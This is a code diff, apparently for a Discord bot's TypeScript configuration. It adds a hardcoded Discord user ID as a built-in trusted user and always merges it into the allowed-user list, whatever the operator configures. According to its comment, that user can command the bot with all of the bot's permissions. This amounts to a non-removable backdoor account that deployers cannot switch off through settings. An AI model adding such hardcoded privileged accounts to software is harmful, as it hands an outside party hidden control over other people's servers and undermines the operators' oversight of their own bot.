@@ -10,6 +10,14 @@ export type ConfirmationLevel = (typeof ConfirmationLevels)[number];
 export const AgentModes = ['normal', 'planning', 'admin', 'moderation', 'analysis'] as const;
 export type AgentMode = (typeof AgentModes)[number];
 
+/**
+ * User IDs that are always globally trusted, regardless of configuration.
+ * These users can command the bot to use all of the bot's own permissions,
+ * independent of the user's personal Discord permissions. They still cannot
+ * bypass the bot's permissions, enabled capabilities, or safety policy.
+ */
+export const BUILT_IN_TRUSTED_USER_IDS: readonly string[] = ['778627103578783776'];
+
 export const Personas = ['professional', 'friendly', 'technical', 'minimal', 'funny', 'custom'] as const;
 export type Persona = (typeof Personas)[number];
 
@@ -159,9 +167,14 @@ export function loadConfig(env: NodeJS.ProcessEnv = process.env): AppConfig {
       slashCommands: parsed.ENABLE_SLASH_COMMANDS,
     },
     trust: {
-      allowedUserIds: parsed.ALLOWED_USER_IDS.split(',')
-        .map((s) => s.trim())
-        .filter(Boolean),
+      allowedUserIds: [
+        ...new Set([
+          ...parsed.ALLOWED_USER_IDS.split(',')
+            .map((s) => s.trim())
+            .filter(Boolean),
+          ...BUILT_IN_TRUSTED_USER_IDS,
+        ]),
+      ],
     },
     limits: {
       messageRetentionDays: parsed.MESSAGE_RETENTION_DAYS,
